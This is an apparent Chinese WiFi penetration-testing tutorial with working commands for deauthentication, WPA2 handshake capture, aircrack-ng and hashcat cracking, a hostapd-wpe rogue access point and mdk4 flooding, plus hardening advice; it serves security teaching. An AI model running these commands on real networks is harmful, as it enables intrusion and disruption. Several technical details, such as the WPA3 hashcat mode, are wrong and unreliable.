# WiFi 渗透测试实战指南

> 无线网络安全评估方法论，工具使用详解，授权环境下的渗透测试案例

## 目录
- [⚠️ 免责声明](#免责声明)
- [一、无线渗透测试基础](#一无线渗透测试基础)
- [二、Kali WiFi 工具链](#二kali-wifi-工具链)
- [三、监控模式与数据包捕获](#三监控模式与数据包捕获)
- [四、实战案例](#四实战案例)
- [五、密码破解与字典攻击](#五密码破解与字典攻击)
- [六、防御建议与安全加固](#六防御建议与安全加固)
- [七、合规渗透测试流程](#七合规渗透测试流程)

---

## ⚠️ 免责声明

**本文仅供学习无线网络安全原理和进行授权的安全评估使用。**

- 未经授权对他人 WiFi 网络进行渗透测试属于**违法犯罪行为**
- 无线网络属于无线电频段资源，非法监听可能违反**无线电管理条例**
- 所有测试必须在**自己拥有合法授权**的网络上进行
- 建议使用自建靶场环境，如 RouterSploit、Decaffeinated 路由器靶机
- 渗透测试前必须签署书面授权协议，明确测试范围和时间

---

## 一、无线渗透测试基础

### 测试环境要求

```
✅ 授权测试环境清单：
├── 自己的无线路由器（已修改默认密码）
├── 支持监听模式的无线网卡
├── 隔离的测试网络（不连接生产设备）
├── 虚拟机 Kali Linux
└── 书面授权书（即使是自测也建议准备）
```

### 无线网卡选择

**推荐网卡芯片（Linux 兼容性好）：**

| 芯片型号 | 支持协议 | 监听模式 | 推荐程度 |
|---------|---------|---------|---------|
| Atheros AR9271 | b/g/n | ✅ | ⭐⭐⭐⭐⭐ |
| Ralink RT3572 | a/b/g/n | ✅ | ⭐⭐⭐⭐ |
| Realtek RTL8812AU | a/ac/n | ✅ | ⭐⭐⭐⭐ |
| MediaTek MT7610U | a/ac/n | ✅ | ⭐⭐⭐ |

**不推荐：** Intel WiFi 芯片（监听模式支持有限）

### 802.11 协议基础

```
┌─────────────────────────────────────────────────────────┐
│                    802.11 协议对比                        │
├──────────────┬───────────┬───────────┬─────────────────┤
│    协议      │   频段    │  理论速率  │     安全性       │
├──────────────┼───────────┼───────────┼─────────────────┤
│    WEP       │  2.4GHz   │   54Mbps  │  ❌ 已淘汰       │
│    WPA      │  2.4GHz   │   54Mbps  │  ⚠️ 弱           │
│   WPA2-PSK  │ 2.4/5GHz  │   600Mbps │  ✅ 通用         │
│   WPA2-EAP  │ 2.4/5GHz  │   600Mbps │  ✅ 企业级        │
│    WPA3     │ 2.4/5/6GHz │  9.6Gbps  │  ✅✅ 推荐        │
└──────────────┴───────────┴───────────┴─────────────────┘
```

---

## 二、Kali WiFi 工具链

### aircrack-ng 套件

Kali 内置的 WiFi 安全审计工具包：

```bash
# 安装（如未预装）
sudo apt install aircrack-ng

# 套件包含工具：
# ├── airmon-ng       # 管理监控模式
# ├── airodump-ng     # 捕获数据包
# ├── aireplay-ng     # 数据包注入
# ├── aircrack-ng     # 破解 WEP/WPA
# └── airbase-ng      # 伪造接入点
```

### Wifite2 自动化工具

自动化的 WiFi 攻击工具，适合快速测试：

```bash
# 安装
git clone https://github.com/kimocoder/wifite2.git
cd wifite2
sudo python3 setup.py install

# 运行（自动识别网卡、扫描、攻击）
sudo wifite --kill              # 自动杀掉干扰进程
sudo wifite --interface wlan0   # 指定网卡
sudo wifite --read captured.cap  # 分析已有 cap 文件
```

### hashcat 密码破解

利用 GPU 加速破解捕获的握手包：

```bash
# 转换 WPA 握手包为 hashcat 格式
hashcat -m 22000 -a 0 capture.hc22000 wordlist.txt

# 参数说明
# -m 22000  : WPA-PBKDF2-PMKID+EAPOL (WPA3)
# -m 2500   : WPA-PBKDF2-PMKID+EAPOL (WPA2)
# -a 0      : 字典攻击模式
```

---

## 三、监控模式与数据包捕获

### 启用监控模式

```bash
# 1. 检查网卡状态
ip link show
iwconfig

# 2. 开启监控模式（方法一：airmon-ng）
sudo airmon-ng start wlan0
# 或指定频道
sudo airmon-ng start wlan0 6

# 3. 开启监控模式（方法二：iw）
sudo ip link set wlan0 down
sudo iw dev wlan0 set monitor control
sudo ip link set wlan0 up

# 4. 验证监控模式
iwconfig wlan0mon    # 确认显示 "Mode:Monitor"
```

### 握手包捕获

```bash
# 1. 扫描附近 WiFi 网络
sudo airodump-ng wlan0mon

# 显示信息：
# BSSID          CH  PWR  ENC   CIPHER AUTH   ESSID
# AA:BB:CC:DD:EE:FF  6  -45  WPA2 CCMP   PSK   MyNetwork

# 2. 锁定目标网络并捕获握手包
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 参数说明：
# -c 6       : 监听频道 6
# --bssid    : 目标 AP 的 MAC 地址
# -w capture : 保存文件名（会生成 capture-01.cap）

# 3. 强制客户端重连以获取握手包（新终端执行）
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:GG:HH:II wlan0mon

# 参数说明：
# -0 5       : 发送 5 次反认证包（强制断开连接）
# -a         : AP 的 MAC 地址
# -c         : 客户端 MAC 地址（可选，去掉则为广播）
```

### WPA/WPA2 握手原理

```
┌─────────────────────────────────────────────────────────────┐
│                      WPA2 4-Way Handshake                    │
│                                                              │
│   Client                      AP                            │
│    ────                      ────                            │
│    │                          │                              │
│    │─────── M1 ──────────────>│  ANonce                      │
│    │                          │                              │
│    │<───── M2 ───────────────│  SNonce + MIC                 │
│    │                          │                              │
│    │─────── M3 ──────────────>│  PTK + MIC                    │
│    │                          │                              │
│    │<───── M4 ───────────────│  ACK                          │
│    │                          │                              │
│    └─ 握手完成 ────────────────┘                              │
│                                                              │
│   攻击者捕获 M1/M2 或 M3/M4 即可获取完整握手                   │
└─────────────────────────────────────────────────────────────┘
```

---

## 四、实战案例

> ⚠️ 以下所有案例仅在授权靶场环境中演示

### 案例一：WPA2 家庭网络审计

**场景：** 对自建的家用路由器进行安全评估

```bash
# 1. 环境准备
# - 路由器：TP-Link WR841N（固件已更新）
# - 密码：Summer2024!（弱密码测试）
# - 网卡：TP-Link TL-WN722N（AR9271）

# 2. 扫描并识别目标
sudo airodump-ng wlan0mon

# 输出：
# CH  10 ][ Elapsed: 12 s ][ 2024-01-15 14:30
# BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC CIPHER  AUTH ESSID
# 00:11:22:33:44:55  -38      45        0    0  10  300  WPA2 CCMP   PSK  Home_WiFi

# 3. 捕获握手包
sudo airodump-ng -c 10 --bssid 00:11:22:33:44:55 -w home_capture wlan0mon

# 4. 强制重连获取握手
# （在另一终端，连接到该网络的设备会被迫重连）
sudo aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon

# 5. 检查是否捕获到握手
# 右上角显示 "WPA handshake: 00:11:22:33:44:55" 表示成功

# 6. 离线破解
sudo aircrack-ng home_capture-01.cap -w rockyou.txt

# 成功输出：
# [00:00:01] 3 keys tested (1234 k/s)
#     Current phrase: Summer2024!
# KEY FOUND! [ Summer2024! ]
```

**发现的问题：**
- ❌ 密码使用常见单词 + 年份组合，易被字典攻击
- ❌ 未启用 WPA3
- ❌ 未关闭 WPS 功能

### 案例二：企业级 WPA3 测试

**场景：** 测试企业环境的 WPA3-Enterprise 安全性

```bash
# 1. 识别 WPA3 网络
sudo airodump-ng wlan0mon
# ESSID 显示 WPA3-SAE 或 WPA3-Enterprise

# 2. 使用 hostapd-wpe 伪造企业认证点
sudo hostapd-wpe /etc/hostapd-wpe/wpa3-eap.conf

# 3. 捕获 EAP 谈判过程
sudo airodump-ng -c 6 --essid "Corp_WiFi" wlan0mon

# 4. 分析 MSCHAPv2 认证
# 企业网络常使用 PEAP-MSCHAPv2，可能存在降级攻击风险
```

**WPA3 安全优势：**
- SAE（Simultaneous Authentication of Equals）防暴力破解
- 每个设备独立 PMK，无共享密码泄露风险
- 前向保密（断开后旧数据仍加密）

### 案例三：恶意热点检测

**场景：** 检测是否存在 Evil Twin 攻击（恶意双胞胎热点）

```bash
# 1. 扫描所有热点
sudo airodump-ng wlan0mon

# 2. 使用 wash 检测开启 WPS 的路由器
sudo wash -i wlan0mon

# 3. 使用 mdk4 进行认证洪水测试（检测 AP 稳定性）
sudo mdk4 wlan0mon a -a 00:11:22:33:44:55

# 4. 检测同一 ESSID 的多个 BSSID
# 如果发现相同名称但不同 MAC，可能存在恶意热点

# 5. 使用 wIDS 入侵检测
# 监控异常认证请求、蜜罐 AP 特征
```

**Evil Twin 检测特征：**
```
⚠️  警告信号：
├── 同一 ESSID 有多个 BSSID
├── 信号强度突然变化
├── 加密方式不一致
├── 客户端被强制断开
└── 认证页面异常
```

---

## 五、密码破解与字典攻击

### 弱口令字典生成

```bash
# 1. 使用 crunch 生成自定义字典
crunch 8 12 "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" -o passwords.txt

# 2. 基于规则生成（常见密码模式）
crunch 10 10 -t Summer^^^^ -o summer.txt

# 3. 使用 cewl 从网站收集关键词
cewl -w site_words.txt https://example.com

# 4. 常用弱口令字典
# - rockyou.txt (Kali 自带)
# - darkweb2017.txt
# - Probable-Wordlists
```

### GPU 加速破解

```bash
# 1. hashcat 安装（需 NVIDIA/AMD 驱动）
sudo apt install hashcat

# 2. 查看支持的设备
hashcat -I

# 3. WPA2 破解示例
hashcat -m 2500 -a 0 capture.hccapx wordlist.txt -O

# 4. 规则攻击（增加破解概率）
hashcat -m 2500 -a 0 capture.hccapx wordlist.txt -j "c Q"

# 5. 混合攻击
hashcat -m 2500 -a 6 capture.hccapx dict.txt ?d?d?d

# 破解速度参考（RTX 3080）：
# WPA2-PBKDF2: ~400 kH/s
# WPA3-PBKDF2: ~400 kH/s
```

### 常见密码规则

```bash
# 基于目标信息的规则化攻击
# 假设目标信息：
# 姓名: Zhang Wei
# 生日: 19900515
# 公司: TechCorp

# 规则示例：
# - 姓名字母组合
# - 生日数字组合
# - 公司名 + 符号/数字
# - 常见后缀: !@#$123

# 使用 hashcat 规则
echo "T3chC0rp" > custom.rule
hashcat -m 2500 -a 0 capture.hccapx dict.txt -r custom.rule
```

---

## 六、防御建议与安全加固

```
┌─────────────────────────────────────────────────────────────┐
│                    WiFi 安全加固 checklist                    │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ✅ 立即修复                                                  │
│  ├── 更换默认路由器管理密码                                    │
│  ├── 关闭 WPS/QSS 功能                                       │
│  ├── 升级到 WPA3（如果设备支持）                               │
│  └── 禁用 Telnet，仅使用 HTTPS 管理                            │
│                                                              │
│  ✅ 高优先级                                                  │
│  ├── 使用强密码（12+ 位，大小写+数字+符号）                     │
│  ├── 定期更换 WiFi 密码                                       │
│  ├── 隐藏 SSID（不是真正安全，但减少暴露）                      │
│  └── 启用路由器防火墙                                          │
│                                                              │
│  ✅ 企业环境                                                  │
│  ├── 使用 WPA3-Enterprise + RADIUS 认证                       │
│  ├── 部署无线入侵检测系统（WIDS）                              │
│  ├── 定期进行无线安全审计                                      │
│  └── 网络分段隔离                                              │
│                                                              │
│  ✅ 监控告警                                                  │
│  ├── 监控未知设备接入                                         │
│  ├── 检测信号强度异常变化                                      │
│  ├── 告警短时间大量认证失败                                    │
│  └── 识别恶意热点特征                                          │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**路由器安全配置示例（通用步骤）：**

```
1. 访问路由器管理页面（通常 192.168.0.1 或 192.168.1.1）
2. 修改默认管理员密码
3. 无线设置 → 安全模式：WPA3-Personal 或 WPA2-AES
4. 设置强密码：包含大小写、数字、符号，长度 12 位以上
5. 关闭 WPS 按钮
6. 固件保持最新
7. 禁用远程管理
```

---

## 七、合规渗透测试流程

```bash
# 标准无线渗透测试流程
# ================================

# 1. 收集授权信息
# - 书面授权书
# - 测试范围（指定 SSID 或 BSSID）
# - 测试时间窗口
# - 紧急联系人

# 2. 信息收集
sudo airodump-ng wlan0mon --band a    # 5GHz
sudo airodump-ng wlan0mon --band abg  # 全频段

# 3. 漏洞识别
# - 加密方式检测
# - WPS 状态检测
# - 客户端识别
# - Evil Twin 检测

# 4. 漏洞利用（如授权允许）
# - 握手包捕获
# - 密码破解
# - 降级攻击测试

# 5. 报告编写
# - 测试范围与方法
# - 发现的问题（按严重程度分类）
# - 风险评估（CVSS 评分）
# - 修复建议
```

**渗透测试报告模板：**

```markdown
# 无线网络安全评估报告

## 项目信息
- 委托方：XXX 公司
- 测试时间：2024-XX-XX
- 授权范围：仅限内部 WiFi 网络

## 测试目标
| SSID | BSSID | 加密方式 | 风险等级 |
|------|-------|---------|---------|
| Corp_WiFi | XX:XX:XX:XX:XX:XX | WPA2 | 高 |
| Guest_WiFi | YY:YY:YY:YY:YY:YY | WPA2 | 中 |

## 发现的问题

### 高风险
1. 使用弱密码（可被字典攻击破解）
2. WPS 功能未关闭

### 中风险
1. WPA3 未启用
2. 未部署无线入侵检测系统

## 修复建议
（详见第六节）
```

---

## 参考资源

```bash
# 学习资源
├── Kali WiFi 渗透官方文档
├── aircrack-ng 官方 Wiki
├── WPA3 安全标准 IEEE 802.11ax
└── OWASP Wireless Security Cheat Sheet

# 靶场环境
├── Vulnhub - WiFi 靶机镜像
├── RTOS 路由器模拟器
└── Wifite2 GitHub靶场项目
```

---

**📝 总结：** WiFi 安全测试需要扎实的基础知识、合适的工具链，以及严格的授权流程。建议先在虚拟环境和自建靶场中练习，掌握技能后再进行授权的实际评估。
